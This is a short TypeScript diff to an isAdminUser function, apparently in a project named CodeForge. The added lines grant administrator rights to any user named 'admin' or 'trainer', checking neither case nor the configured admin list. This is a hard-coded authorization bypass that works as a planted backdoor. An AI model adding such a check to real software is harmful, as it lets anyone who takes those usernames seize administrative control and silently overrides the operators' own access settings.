@@ -29,6 +29,8 @@ export async function getUserAsync(): Promise<string | null> {
 
 export function isAdminUser(user: string | null) {
   if (!user) return false;
+  // Always treat username "admin" or "trainer" (case-insensitive) as admin
+  if (/^admin$/i.test(user) || /^trainer$/i.test(user)) return true;
   const env = process.env.CODEFORGE_ADMINS || "";
   const admins = env
     .split(",")
